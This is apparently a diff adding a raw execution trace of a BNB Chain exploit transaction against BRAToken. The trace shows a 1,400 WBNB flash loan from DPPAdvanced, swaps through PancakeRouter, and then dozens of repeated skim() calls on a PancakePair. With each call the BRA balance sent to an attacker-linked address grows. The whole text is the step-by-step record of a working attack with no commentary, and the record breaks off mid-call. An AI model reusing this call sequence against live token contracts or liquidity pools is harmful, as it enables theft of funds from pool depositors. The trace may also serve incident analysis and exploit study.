@@ -1,0 +1,1170 @@
+[1][CALL] from=0x67a909, to=0x1fae46, go() -> None
+  [2][CALL] from=0x1fae46, to=DPPAdvanced, flashLoan(baseAmount(uint256): 1400000000000000000000, quoteAmount(uint256): 0, assetTo(address): 0x1FAe46, data(bytes): b'xxas') -> None
+    [3][CALL] from=DPPAdvanced, to=WBNB, transfer(dst(address): 0x1FAe46, wad(uint256): 1400000000000000000000) -> True
+    [3][CALL] from=DPPAdvanced, to=0x1fae46, DPPFlashLoanCalladdress() -> None
+      [4][CALL] from=0x1fae46, to=WBNB, withdraw(wad(uint256): 1400000000000000000000) -> None
+        [5][CALL][1400.0] from=WBNB, to=0x1fae46
+      [4][CALL] from=0x1fae46, to=PancakeRouter, swapExactETHForTokens(amountOutMin(uint256): 1, path(address[]): ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc09..., to(address): 0x1FAe46, deadline(uint256): 111111111111) -> [1000000000000000000000, 271699541664092338012248, 10865310045277259707677]
+        [5][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['63335052447522389340746441', '231526686200174894330517', '1673325637']
+        [5][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['19130492548708862134718', '206163668857403479126341', '1673325553']
+        [5][CALL] from=PancakeRouter, to=WBNB, deposit() -> None
+        [5][CALL] from=PancakeRouter, to=WBNB, transfer(dst(address): 0x16b9a8, wad(uint256): 1000000000000000000000) -> True
+        [5][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 271699541664092338012248, amount1Out(uint256): 0, to(address): 0x8F4BA1, data(bytes): b'') -> None
+          [6][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 271699541664092338012248) -> True
+          [6][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x16b9a8) -> 63063352905858297002734193
+          [6][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x16b9a8) -> 232526686200174894330517
+        [5][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 10865310045277259707677, amount1Out(uint256): 0, to(address): 0x1FAe46, data(bytes): b'') -> None
+          [6][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x1FAe46, amount(uint256): 10865310045277259707677) -> True
+            [7][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+            [7][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+            [7][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+            [7][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+            [7][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 8591141804789920218041
+          [6][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+      [4][STATICCALL] from=0x1fae46, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 8591141804789920218041
+      [4][STATICCALL] from=0x1fae46, to=BRAToken, balanceOf(account(address): 0x1FAe46) -> 10539350743918941916677
+      [4][CALL] from=0x1fae46, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 10539350743918941916677) -> True
+        [5][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+        [5][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+        [5][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+        [5][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+        [5][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 19130492548708862134718
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 10539350743918941916677) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 19446673071026430392018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 10855531266236510173977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 19772339009013525697118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 11181197204223605479077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 20107774925140233861218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 11516633120350313643177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 20453273918750743270418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 11862132113960823052377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 20809137882169567961918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 12217996077379647743877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 21175677764490957394118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 12584535959701037176077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 21553213843281988509218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 12962072038492068291177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 21942076004436750557918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 13350934199646830339877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 22342604030426155467818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 13751462225636235249777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 22755147897195242525018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 14164006092405322306977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 23180068079967402194018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 14588926275177481975977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 23617735868222726653118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 15026594063432806435077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 24068533690125710846018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 15477391885335790627977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 24532855446685784564618
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 15941713641895864346577) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 25011106855942660494818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 16419965051152740276777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 25503705807477242702918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 16912564002687322484877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 26011082727557862377318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 17419940922767942159277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 26533680955240900641818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 17942539150450980423777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 27071957129754430054418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 18480815324964509836377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 27626381589503365349318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 19035239784713445131277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 28197438783044768703218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 19606296978254848485177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 28785627692392414157618
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 20194485887602493939577) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
